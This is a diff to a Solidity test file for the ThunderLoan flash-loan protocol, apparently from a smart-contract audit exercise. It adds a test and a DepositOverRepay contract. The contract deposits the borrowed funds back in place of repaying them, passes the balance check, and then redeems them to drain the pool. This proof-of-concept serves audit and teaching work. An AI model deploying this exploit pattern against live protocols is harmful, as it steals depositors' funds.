@@ -137,6 +137,22 @@ contract ThunderLoanTest is BaseTest {
         // assertEq(tokenA.balanceOf(address(asset)), DEPOSIT_AMOUNT - amountToRedeemInUnderlying);
     }
 
+    ///@notice during a flashLoan, the receiver has to return the funds via repay; but the logic of the
+    /// contract is such that it only checks the balance of teh contract after the loan is returned
+    /// and teh balance of teh cotnract can be manipulated via depositing those fudns (the loan itself)
+    /// and tehn redeeming the loan; thereby stealing the funds
+    function testDepositOverRepay() public setAllowedToken hasDeposits {
+        uint256 amountToB = 10 ether;
+
+        DepositOverRepay dor = new DepositOverRepay(thunderLoan);
+        vm.startPrank(address(dor));
+        tokenA.mint(address(dor), 0.03 ether);
+        thunderLoan.flashloan(address(dor), tokenA, amountToB, "");
+        dor.redeem(address(tokenA), type(uint256).max);
+
+        assert(tokenA.balanceOf(address(dor)) > amountToB + dor.s_fee());
+    }
+
     function testOracleManipulation() public {
         address tester = address(123);
         // 1. Setup the contracts
@@ -255,5 +271,37 @@ contract TestLoanReceiever is IFlashLoanReceiver {
 
             IERC20(tokenA).transfer(address(repayAddr), amount + fee2);
         }
+    }
+}
+
+contract DepositOverRepay is IFlashLoanReceiver {
+    ThunderLoan public thunderLoan;
+    IERC20 public s_token;
+    uint256 public s_fee;
+
+    constructor(ThunderLoan _thunderLoan) {
+        thunderLoan = _thunderLoan;
+    }
+
+    function executeOperation(
+        address token,
+        uint256 amount,
+        uint256 fee,
+        address, /*initiator*/
+        bytes calldata /*params*/
+    )
+        external
+        override
+        returns (bool)
+    {
+        s_token = IERC20(token);
+        s_fee = fee;
+        s_token.approve(address(thunderLoan), type(uint256).max);
+        thunderLoan.deposit(IERC20(token), amount + fee);
+        return true;
+    }
+
+    function redeem(address token, uint256 amount) public {
+        thunderLoan.redeem(IERC20(token), amount);
     }
 }
